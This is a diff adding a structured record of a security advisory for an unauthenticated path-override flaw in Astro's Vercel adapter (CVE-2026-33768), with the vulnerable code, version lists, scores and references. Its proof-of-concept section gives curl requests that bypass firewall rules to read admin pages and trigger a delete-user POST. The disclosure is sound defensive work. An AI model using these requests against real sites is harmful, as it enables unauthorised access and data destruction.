@@ -1,0 +1,443 @@
+advisory_id: GHSA-mr6q-rp88-fx84
+datasource_id: github_osv/GHSA-mr6q-rp88-fx84
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-mr6q-rp88-fx84/GHSA-mr6q-rp88-fx84.json
+aliases:
+  - CVE-2026-33768
+summary: |
+  Astro: Unauthenticated Path Override via `x-astro-path` / `x_astro_path`
+  ## Summary
+
+  The `@astrojs/vercel` serverless entrypoint reads the `x-astro-path` header and `x_astro_path` query parameter to rewrite the internal request path, with no authentication whatsoever. On deployments without Edge Middleware, this lets anyone bypass Vercel's platform-level path restrictions entirely.
+
+  The override preserves the original HTTP method and body, so this isn't limited to GET. POST, PUT, DELETE all land on the rewritten path. A Firewall rule blocking `/admin/*` does nothing when the request comes in as `POST /api/health?x_astro_path=/admin/delete-user`.
+
+  ## Affected Versions
+
+  Verified against:
+  - **Astro 5.18.1 + @astrojs/vercel 9.0.4** — GET and POST override both work. Full exploitation.
+  - **Astro 6.0.3 + @astrojs/vercel 10.0.0** — GET override works. POST/DELETE hit a `duplex` bug in the Request constructor (the `duplex: 'half'` option is required when passing a ReadableStream body — this has been an issue since Node.js 18 but is consistently enforced in the Node.js 22+ runtime that Astro 6 requires). This is not a security fix — the code explicitly passes `body: request.body` and intends to preserve it. Once the missing `duplex` option is added, all methods will be exploitable on v6 as well.
+
+  The vulnerable code path is identical across both versions.
+
+  ## Affected Component
+
+  - **Package**: `@astrojs/vercel`
+  - **File**: `packages/integrations/vercel/src/serverless/entrypoint.ts` (lines 19–28)
+  - **Constants**: `packages/integrations/vercel/src/index.ts` (lines 44–45)
+
+  ## Vulnerable Code
+
+  The handler blindly trusts the caller-supplied path:
+
+  ```typescript
+  const realPath =
+      request.headers.get(ASTRO_PATH_HEADER) ??
+      url.searchParams.get(ASTRO_PATH_PARAM);
+  if (typeof realPath === 'string') {
+      url.pathname = realPath;  // no validation, no auth
+      request = new Request(url.toString(), {
+          method: request.method,   // preserved
+          headers: request.headers, // preserved
+          body: request.body,       // preserved
+      });
+  }
+  ```
+
+  What makes this worse is the inconsistency. `x-astro-locals` right below it is gated behind `middlewareSecret`, but `x-astro-path` gets nothing:
+
+  ```typescript
+  // x-astro-locals: protected
+  if (astroLocalsHeader) {
+      if (middlewareSecretHeader !== middlewareSecret) {
+          return new Response('Forbidden', { status: 403 });
+      }
+      locals = JSON.parse(astroLocalsHeader);
+  }
+  // x-astro-path: no equivalent check (lines 19-28 above)
+  ```
+
+  ## Conditions
+
+  1. Astro + `@astrojs/vercel` adapter
+  2. `output: 'server'` (SSR)
+  3. No `src/middleware.ts` defined, or middleware not using Edge mode
+
+  This is a realistic production configuration. Middleware is optional and many deployments skip it.
+
+  The `x-astro-path` mechanism exists for a legitimate purpose: when Edge Middleware is present, it forwards requests to a single serverless function (`_render`) and uses this header to communicate the original path. The Edge Middleware always overwrites any client-supplied value with the correct one. But when no Edge Middleware is configured, requests hit the serverless function directly, and the override is exposed to external callers with no protection.
+
+  ## Proof of Concept
+
+  Setup: minimal Astro SSR project on Vercel, no middleware. Routes: `/public` (page), `/api/health` (API endpoint), `/admin/secret` (page), `/admin/delete-user` (API endpoint). Vercel Firewall blocks `/admin/*`.
+
+  **GET — page content override:**
+  ```bash
+  curl "https://target.vercel.app/public?x_astro_path=/admin/secret"
+  # Returns: PAGE_ID: admin-secret
+  ```
+
+  **GET — API route override:**
+  ```bash
+  curl "https://target.vercel.app/api/health?x_astro_path=/admin/delete-user"
+  # Returns: {"pageId":"admin-delete-user","message":"This is a protected admin API endpoint","method":"GET"}
+  ```
+
+  **Header override:**
+  ```bash
+  curl -H "x-astro-path: /admin/secret" https://target.vercel.app/public
+  # Returns: PAGE_ID: admin-secret
+  ```
+
+  **Vercel Firewall bypass (GET):**
+  ```bash
+  # Direct access — blocked
+  curl https://target.vercel.app/admin/secret
+  # Returns: Forbidden
+
+  # Via override — Firewall sees /public, serves /admin/secret
+  curl "https://target.vercel.app/public?x_astro_path=/admin/secret"
+  # Returns: PAGE_ID: admin-secret
+  ```
+
+  **Vercel Firewall bypass (POST) — verified on Astro 5.x:**
+  ```bash
+  # Direct access — blocked
+  curl -X POST -H "Content-Type: application/json" -d '{"userId":"123"}' \
+    https://target.vercel.app/admin/delete-user
+  # Returns: Forbidden
+
+  # Via override — Firewall sees /api/health, executes POST /admin/delete-user
+  curl -X POST -H "Content-Type: application/json" -d '{"userId":"123"}' \
+    "https://target.vercel.app/api/health?x_astro_path=/admin/delete-user"
+  # Returns: {"action":"delete-user","status":"deleted","method":"POST"}
+  ```
+
+  The Firewall evaluates the original path. The serverless function serves the overridden path. Method and body carry over.
+
+  ISR is not affected. Vercel's cache layer appears to intercept before the function runs.
+
+  ## Impact
+
+  **Firewall/WAF bypass — read (Critical):** Any path-based restriction in Vercel Dashboard or `vercel.json` (IP blocks, geo restrictions, rate limits scoped to specific paths) can be bypassed for GET requests. Protected page content and API responses are fully readable.
+
+  **Firewall/WAF bypass — write (Critical):** POST/PUT/DELETE requests also bypass Firewall rules. The method and body are preserved through the override, so any write endpoint behind path-based restrictions is reachable. Verified on Astro 5.x; on 6.x this is blocked by an unrelated `duplex` bug in the Request constructor, not by any security check.
+
+  **Audit log mismatch (Medium):** Vercel logs record the original request path and query string (e.g. `/public?x_astro_path=/admin/secret`), so the override parameter is technically visible. However, the logged path (`/public`) does not reflect the path actually served (`/admin/secret`). Detecting this attack from logs requires knowing what `x_astro_path` means — standard monitoring and alerting based on request paths will not catch it.
+
+  ## Prior Art
+
+  CVE-2025-29927 (Next.js): `x-middleware-subrequest` header injectable by external clients, bypassing middleware. Same class of vulnerability.
+impacted_packages:
+  - purl: pkg:github/withastro/astro
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/withastro/astro
+        commit: 335a204161f5a7293c128db570901d4f8639c6ed
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/%40astrojs/vercel
+    affected_versions: vers:npm/<10.0.2
+    fixed_versions: vers:npm/10.0.2
+    affected_packages:
+      - pkg:npm/%40astrojs/vercel@0.0.0-9591-20240103143428
+      - pkg:npm/%40astrojs/vercel@0.0.0-9624-20240105191325
+      - pkg:npm/%40astrojs/vercel@0.0.0-add-stable-20231208215901
+      - pkg:npm/%40astrojs/vercel@0.0.0-allow-cc-20240222155628
+      - pkg:npm/%40astrojs/vercel@0.0.0-astro-content-fix-20240207175526
+      - pkg:npm/%40astrojs/vercel@0.0.0-astro-env-20240508155554
+      - pkg:npm/%40astrojs/vercel@0.0.0-cloudcannon-fix-20230306211609
+      - pkg:npm/%40astrojs/vercel@0.0.0-content-schemas-20221205202838
+      - pkg:npm/%40astrojs/vercel@0.0.0-edge-middleware-verification-20240205180401
+      - pkg:npm/%40astrojs/vercel@0.0.0-edge-middleware-verification-20240207135919
+      - pkg:npm/%40astrojs/vercel@0.0.0-edge-nested-20240223135627
+      - pkg:npm/%40astrojs/vercel@0.0.0-experimental-assets-20230307131344
+      - pkg:npm/%40astrojs/vercel@0.0.0-experimental-container-20240613104104
+      - pkg:npm/%40astrojs/vercel@0.0.0-handle-unhandled-20231213142946
+      - pkg:npm/%40astrojs/vercel@0.0.0-handle-unhandled-20231213202808
+      - pkg:npm/%40astrojs/vercel@0.0.0-image-image-size-20230309180922
+      - pkg:npm/%40astrojs/vercel@0.0.0-imgcache-20220929145446
+      - pkg:npm/%40astrojs/vercel@0.0.0-include-files-20221014115259
+      - pkg:npm/%40astrojs/vercel@0.0.0-include-files-20221014142503
+      - pkg:npm/%40astrojs/vercel@0.0.0-isr-20240110194136
+      - pkg:npm/%40astrojs/vercel@0.0.0-isr-20240125224234
+      - pkg:npm/%40astrojs/vercel@0.0.0-loaders-20230222215040
+      - pkg:npm/%40astrojs/vercel@0.0.0-markdoc-config-changes-20230626153541
+      - pkg:npm/%40astrojs/vercel@0.0.0-monorepos-20221010031242
+      - pkg:npm/%40astrojs/vercel@0.0.0-monorepos-20221010034522
+      - pkg:npm/%40astrojs/vercel@0.0.0-monorepos-20221010034923
+      - pkg:npm/%40astrojs/vercel@0.0.0-netlify-edge-middleware-20230712131416
+      - pkg:npm/%40astrojs/vercel@0.0.0-node-standalone-20221011210529
+      - pkg:npm/%40astrojs/vercel@0.0.0-non-admin-test-20240308195029
+      - pkg:npm/%40astrojs/vercel@0.0.0-outlet-20230516145630
+      - pkg:npm/%40astrojs/vercel@0.0.0-perf-20230907211008
+      - pkg:npm/%40astrojs/vercel@0.0.0-perf-20230907211643
+      - pkg:npm/%40astrojs/vercel@0.0.0-prerender-20221205225045
+      - pkg:npm/%40astrojs/vercel@0.0.0-rc-20220721064837
+      - pkg:npm/%40astrojs/vercel@0.0.0-rc-20220722032928
+      - pkg:npm/%40astrojs/vercel@0.0.0-rc-20220725043302
+      - pkg:npm/%40astrojs/vercel@0.0.0-rc-20220726043527
+      - pkg:npm/%40astrojs/vercel@0.0.0-react-children-client-20231023164643
+      - pkg:npm/%40astrojs/vercel@0.0.0-refactor-20230203142617
+      - pkg:npm/%40astrojs/vercel@0.0.0-refactor-prerender-20240612145528
+      - pkg:npm/%40astrojs/vercel@0.0.0-refactor-prerender-20240614140807
+      - pkg:npm/%40astrojs/vercel@0.0.0-render-nodejs-20240213145612
+      - pkg:npm/%40astrojs/vercel@0.0.0-server-islands-20240621194657
+      - pkg:npm/%40astrojs/vercel@0.0.0-server-islands-20240703133809
+      - pkg:npm/%40astrojs/vercel@0.0.0-server-islands-20240709194928
+      - pkg:npm/%40astrojs/vercel@0.0.0-set-cookie-20221202105120
+      - pkg:npm/%40astrojs/vercel@0.0.0-set-cookie-20221202112631
+      - pkg:npm/%40astrojs/vercel@0.0.0-set-cookie-20221212172245
+      - pkg:npm/%40astrojs/vercel@0.0.0-skew-protection-20240412093445
+      - pkg:npm/%40astrojs/vercel@0.0.0-symbolic-link-20230901124103
+      - pkg:npm/%40astrojs/vercel@0.0.0-toolbar-absolute-paths-20240126155246
+      - pkg:npm/%40astrojs/vercel@0.0.0-toolbar-improvements-20240405132324
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-clientaddress-20230309142435
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-code-20221115152330
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-code-20221115163845
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-code-20221115172023
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-code-20221115191719
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-crypto-fix-20240214095320
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-edge-middleware-20230627120036
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-edge-middleware-20230627124653
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-edge-middleware-20230629145510
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-edge-middleware-20230630125718
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-fix-20230227213700
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-fix-20230227215002
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-2-20221111232103
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-2-20221112151551
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230414114211
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230427141448
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230427142407
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230427145833
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230427150422
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230427151639
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-image-20230428112211
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-json-20230313191807
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-json-20230313193421
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-json-20230313194145
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-json-20230313200730
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-json-20230313201834
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-routing-20250129140158
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-routing-20250129162731
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-sharp-nft-20240303150417
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-speed-insights-20230905180431
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-speed-insights-20230912155045
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-split-20230629135007
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-src-20240411132931
+      - pkg:npm/%40astrojs/vercel@0.0.0-vercel-static-adapter-20230831114928
+      - pkg:npm/%40astrojs/vercel@0.0.0-view-transitions-20230630132601
+      - pkg:npm/%40astrojs/vercel@0.0.0-vt-fallback-filter-20230831163443
+      - pkg:npm/%40astrojs/vercel@0.0.0-vt-fallback-filter-20230831170045
+      - pkg:npm/%40astrojs/vercel@0.0.0-vt-partytown-20231212203707
+      - pkg:npm/%40astrojs/vercel@0.0.2
+      - pkg:npm/%40astrojs/vercel@0.0.3-beta.0
+      - pkg:npm/%40astrojs/vercel@0.0.3-beta.1
+      - pkg:npm/%40astrojs/vercel@0.1.0
+      - pkg:npm/%40astrojs/vercel@0.1.1
+      - pkg:npm/%40astrojs/vercel@0.1.2
+      - pkg:npm/%40astrojs/vercel@0.1.3
+      - pkg:npm/%40astrojs/vercel@0.1.4
+      - pkg:npm/%40astrojs/vercel@0.2.0
+      - pkg:npm/%40astrojs/vercel@0.2.1
+      - pkg:npm/%40astrojs/vercel@0.2.2
+      - pkg:npm/%40astrojs/vercel@0.2.3
+      - pkg:npm/%40astrojs/vercel@0.2.4
+      - pkg:npm/%40astrojs/vercel@0.2.5
+      - pkg:npm/%40astrojs/vercel@0.2.6
+      - pkg:npm/%40astrojs/vercel@0.3.0
+      - pkg:npm/%40astrojs/vercel@0.4.0
+      - pkg:npm/%40astrojs/vercel@1.0.0
+      - pkg:npm/%40astrojs/vercel@1.0.1
+      - pkg:npm/%40astrojs/vercel@1.0.2
+      - pkg:npm/%40astrojs/vercel@2.0.0
+      - pkg:npm/%40astrojs/vercel@2.0.1
+      - pkg:npm/%40astrojs/vercel@2.1.0
+      - pkg:npm/%40astrojs/vercel@2.1.1
+      - pkg:npm/%40astrojs/vercel@2.2.0
+      - pkg:npm/%40astrojs/vercel@2.3.0
+      - pkg:npm/%40astrojs/vercel@2.3.1
+      - pkg:npm/%40astrojs/vercel@2.3.2
+      - pkg:npm/%40astrojs/vercel@2.3.3
+      - pkg:npm/%40astrojs/vercel@2.3.4
+      - pkg:npm/%40astrojs/vercel@2.3.5
+      - pkg:npm/%40astrojs/vercel@2.3.6
+      - pkg:npm/%40astrojs/vercel@2.4.0
+      - pkg:npm/%40astrojs/vercel@3.0.0-beta.0
+      - pkg:npm/%40astrojs/vercel@3.0.0-beta.1
+      - pkg:npm/%40astrojs/vercel@3.0.0
+      - pkg:npm/%40astrojs/vercel@3.0.1
+      - pkg:npm/%40astrojs/vercel@3.1.0
+      - pkg:npm/%40astrojs/vercel@3.1.1
+      - pkg:npm/%40astrojs/vercel@3.1.2
+      - pkg:npm/%40astrojs/vercel@3.1.3
+      - pkg:npm/%40astrojs/vercel@3.1.4
+      - pkg:npm/%40astrojs/vercel@3.2.0
+      - pkg:npm/%40astrojs/vercel@3.2.1
+      - pkg:npm/%40astrojs/vercel@3.2.2
+      - pkg:npm/%40astrojs/vercel@3.2.3
+      - pkg:npm/%40astrojs/vercel@3.2.4
+      - pkg:npm/%40astrojs/vercel@3.2.5
+      - pkg:npm/%40astrojs/vercel@3.3.0
+      - pkg:npm/%40astrojs/vercel@3.4.0
+      - pkg:npm/%40astrojs/vercel@3.4.1
+      - pkg:npm/%40astrojs/vercel@3.5.0
+      - pkg:npm/%40astrojs/vercel@3.5.1
+      - pkg:npm/%40astrojs/vercel@3.6.0
+      - pkg:npm/%40astrojs/vercel@3.7.0
+      - pkg:npm/%40astrojs/vercel@3.7.1
+      - pkg:npm/%40astrojs/vercel@3.7.2
+      - pkg:npm/%40astrojs/vercel@3.7.3
+      - pkg:npm/%40astrojs/vercel@3.7.4
+      - pkg:npm/%40astrojs/vercel@3.7.5
+      - pkg:npm/%40astrojs/vercel@3.8.0
+      - pkg:npm/%40astrojs/vercel@3.8.1
+      - pkg:npm/%40astrojs/vercel@3.8.2
+      - pkg:npm/%40astrojs/vercel@4.0.0-beta.0
+      - pkg:npm/%40astrojs/vercel@4.0.0-beta.1
+      - pkg:npm/%40astrojs/vercel@4.0.0-beta.2
+      - pkg:npm/%40astrojs/vercel@4.0.0-beta.3
+      - pkg:npm/%40astrojs/vercel@4.0.0-rc.4
+      - pkg:npm/%40astrojs/vercel@4.0.0-rc.5
+      - pkg:npm/%40astrojs/vercel@4.0.0
+      - pkg:npm/%40astrojs/vercel@4.0.1
+      - pkg:npm/%40astrojs/vercel@4.0.2
+      - pkg:npm/%40astrojs/vercel@4.0.3
+      - pkg:npm/%40astrojs/vercel@4.0.4
+      - pkg:npm/%40astrojs/vercel@4.0.5
+      - pkg:npm/%40astrojs/vercel@5.0.0
+      - pkg:npm/%40astrojs/vercel@5.0.1
+      - pkg:npm/%40astrojs/vercel@5.0.2
+      - pkg:npm/%40astrojs/vercel@5.1.0
+      - pkg:npm/%40astrojs/vercel@5.2.0
+      - pkg:npm/%40astrojs/vercel@6.0.0-beta.0
+      - pkg:npm/%40astrojs/vercel@6.0.0-beta.1
+      - pkg:npm/%40astrojs/vercel@6.0.0-beta.2
+      - pkg:npm/%40astrojs/vercel@6.0.0
+      - pkg:npm/%40astrojs/vercel@6.0.1
+      - pkg:npm/%40astrojs/vercel@6.0.2
+      - pkg:npm/%40astrojs/vercel@6.1.0
+      - pkg:npm/%40astrojs/vercel@6.1.1
+      - pkg:npm/%40astrojs/vercel@6.1.2
+      - pkg:npm/%40astrojs/vercel@6.1.3
+      - pkg:npm/%40astrojs/vercel@6.1.4
+      - pkg:npm/%40astrojs/vercel@7.0.0
+      - pkg:npm/%40astrojs/vercel@7.0.1
+      - pkg:npm/%40astrojs/vercel@7.0.2
+      - pkg:npm/%40astrojs/vercel@7.1.0
+      - pkg:npm/%40astrojs/vercel@7.1.1
+      - pkg:npm/%40astrojs/vercel@7.2.0
+      - pkg:npm/%40astrojs/vercel@7.3.0
+      - pkg:npm/%40astrojs/vercel@7.3.1
+      - pkg:npm/%40astrojs/vercel@7.3.2
+      - pkg:npm/%40astrojs/vercel@7.3.3
+      - pkg:npm/%40astrojs/vercel@7.3.4
+      - pkg:npm/%40astrojs/vercel@7.3.5
+      - pkg:npm/%40astrojs/vercel@7.3.6
+      - pkg:npm/%40astrojs/vercel@7.4.0
+      - pkg:npm/%40astrojs/vercel@7.5.0
+      - pkg:npm/%40astrojs/vercel@7.5.1
+      - pkg:npm/%40astrojs/vercel@7.5.2
+      - pkg:npm/%40astrojs/vercel@7.5.3
+      - pkg:npm/%40astrojs/vercel@7.5.4
+      - pkg:npm/%40astrojs/vercel@7.6.0
+      - pkg:npm/%40astrojs/vercel@7.7.0
+      - pkg:npm/%40astrojs/vercel@7.7.1
+      - pkg:npm/%40astrojs/vercel@7.7.2
+      - pkg:npm/%40astrojs/vercel@7.8.0
+      - pkg:npm/%40astrojs/vercel@7.8.1
+      - pkg:npm/%40astrojs/vercel@7.8.2
+      - pkg:npm/%40astrojs/vercel@8.0.0-alpha.0
+      - pkg:npm/%40astrojs/vercel@8.0.0-alpha.1
+      - pkg:npm/%40astrojs/vercel@8.0.0-beta.2
+      - pkg:npm/%40astrojs/vercel@8.0.0-beta.3
+      - pkg:npm/%40astrojs/vercel@8.0.0-beta.4
+      - pkg:npm/%40astrojs/vercel@8.0.0
+      - pkg:npm/%40astrojs/vercel@8.0.1
+      - pkg:npm/%40astrojs/vercel@8.0.2
+      - pkg:npm/%40astrojs/vercel@8.0.3
+      - pkg:npm/%40astrojs/vercel@8.0.4
+      - pkg:npm/%40astrojs/vercel@8.0.5
+      - pkg:npm/%40astrojs/vercel@8.0.6
+      - pkg:npm/%40astrojs/vercel@8.0.7
+      - pkg:npm/%40astrojs/vercel@8.0.8
+      - pkg:npm/%40astrojs/vercel@8.1.0
+      - pkg:npm/%40astrojs/vercel@8.1.1
+      - pkg:npm/%40astrojs/vercel@8.1.2
+      - pkg:npm/%40astrojs/vercel@8.1.3
+      - pkg:npm/%40astrojs/vercel@8.1.4
+      - pkg:npm/%40astrojs/vercel@8.1.5
+      - pkg:npm/%40astrojs/vercel@8.2.0
+      - pkg:npm/%40astrojs/vercel@8.2.1
+      - pkg:npm/%40astrojs/vercel@8.2.2
+      - pkg:npm/%40astrojs/vercel@8.2.3
+      - pkg:npm/%40astrojs/vercel@8.2.4
+      - pkg:npm/%40astrojs/vercel@8.2.5
+      - pkg:npm/%40astrojs/vercel@8.2.6
+      - pkg:npm/%40astrojs/vercel@8.2.7
+      - pkg:npm/%40astrojs/vercel@8.2.8
+      - pkg:npm/%40astrojs/vercel@8.2.9
+      - pkg:npm/%40astrojs/vercel@8.2.10
+      - pkg:npm/%40astrojs/vercel@8.2.11
+      - pkg:npm/%40astrojs/vercel@9.0.0
+      - pkg:npm/%40astrojs/vercel@9.0.1
+      - pkg:npm/%40astrojs/vercel@9.0.2
+      - pkg:npm/%40astrojs/vercel@9.0.3
+      - pkg:npm/%40astrojs/vercel@9.0.4
+      - pkg:npm/%40astrojs/vercel@9.0.5
+      - pkg:npm/%40astrojs/vercel@10.0.0-alpha.0
+      - pkg:npm/%40astrojs/vercel@10.0.0-alpha.1
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.0
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.1
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.2
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.3
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.4
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.5
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.6
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.7
+      - pkg:npm/%40astrojs/vercel@10.0.0-beta.8
+      - pkg:npm/%40astrojs/vercel@10.0.0
+      - pkg:npm/%40astrojs/vercel@10.0.1
+    fixed_packages:
+      - pkg:npm/%40astrojs/vercel@10.0.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-mr6q-rp88-fx84/GHSA-mr6q-rp88-fx84.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-862
+  - CWE-441
+references:
+  - url: https://github.com/withastro/astro
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/commit/335a204161f5a7293c128db570901d4f8639c6ed
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/pull/15959
+    reference_type:
+    reference_id:
+  - url: https://github.com/withastro/astro/releases/tag/@astrojs/vercel@10.0.2
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33768
+    reference_type:
+    reference_id: CVE-2026-33768
+  - url: https://github.com/advisories/GHSA-f82v-jwr5-mffw
+    reference_type:
+    reference_id: GHSA-f82v-jwr5-mffw
+  - url: https://github.com/withastro/astro/security/advisories/GHSA-mr6q-rp88-fx84
+    reference_type:
+    reference_id: GHSA-mr6q-rp88-fx84
+exploits: []
